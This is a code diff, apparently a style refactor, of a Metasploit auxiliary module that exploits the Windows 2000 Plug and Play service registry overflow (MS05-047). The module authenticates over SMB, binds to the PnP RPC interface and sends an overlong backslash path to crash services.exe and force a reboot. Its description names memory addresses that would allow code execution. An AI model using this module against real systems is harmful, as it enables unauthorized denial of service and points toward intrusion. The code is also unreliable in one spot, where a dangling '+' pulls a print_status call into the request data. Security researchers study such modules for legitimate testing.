@@ -9,32 +9,40 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Microsoft Plug and Play Service Registry Overflow',
-      'Description'    => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'Microsoft Plug and Play Service Registry Overflow',
+        'Description' => %q{
           This module triggers a stack buffer overflow in the Windows Plug
-        and Play service. This vulnerability can be exploited on
-        Windows 2000 without a valid user account. Since the PnP
-        service runs inside the service.exe process, this module
-        will result in a forced reboot on Windows 2000. Obtaining
-        code execution is possible if user-controlled memory can
-        be placed at 0x00000030, 0x0030005C, or 0x005C005C.
-      },
-      'Author'         => [ 'hdm' ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+          and Play service. This vulnerability can be exploited on
+          Windows 2000 without a valid user account. Since the PnP
+          service runs inside the service.exe process, this module
+          will result in a forced reboot on Windows 2000. Obtaining
+          code execution is possible if user-controlled memory can
+          be placed at 0x00000030, 0x0030005C, or 0x005C005C.
+        },
+        'Author' => [ 'hdm' ],
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'CVE', '2005-2120' ],
           [ 'MSB', 'MS05-047' ],
           [ 'BID', '15065' ],
           [ 'OSVDB', '18830' ]
-        ]
-      ))
+        ],
+        'Notes' => {
+          'Stability' => [CRASH_OS_RESTARTS],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
+      )
+    )
 
     register_options(
       [
-        OptString.new('SMBPIPE', [ true,  "The pipe name to use (browser, srvsvc, wkssvc, ntsvcs)", 'browser']),
-      ])
+        OptString.new('SMBPIPE', [ true, 'The pipe name to use (browser, srvsvc, wkssvc, ntsvcs)', 'browser']),
+      ]
+    )
   end
 
 =begin
@@ -50,14 +58,12 @@ long function_0a (
 =end
 
   def run
-
     # Determine which pipe to use
     pipe = datastore['SMBPIPE']
 
-    print_status("Connecting to the SMB service...")
-    connect()
-    smb_login()
-
+    print_status('Connecting to the SMB service...')
+    connect
+    smb_login
 
     # Results of testing on Windows 2000 SP0
     #  324 / 325 exception handled
@@ -74,7 +80,7 @@ long function_0a (
     dcerpc_bind(handle)
     print_status("Bound to #{handle} ...")
 
-    path = "HTREE\\ROOT" + ("\\" * i)
+    path = 'HTREE\\ROOT' + ('\\' * i)
 
     # 0 = nil, 1 = enum, 2/3 = services, 4 = enum (currentcontrolset|caps)
 
@@ -83,8 +89,7 @@ long function_0a (
       NDR.wstring(path) +
       NDR.long(4) +
       NDR.long(1) +
-
-    print_status("Calling the vulnerable function...")
+      print_status('Calling the vulnerable function...')
 
     begin
       dcerpc.call(0x0a, stubdata)
@@ -92,7 +97,7 @@ long function_0a (
       print_good('Server did not respond, this is expected')
     rescue ::Errno::ECONNRESET
       print_good('Connection reset by peer (possible success)')
-    rescue => e
+    rescue StandardError => e
       if e.to_s =~ /STATUS_PIPE_DISCONNECTED/
         print_good('Server disconnected, this is expected')
       else
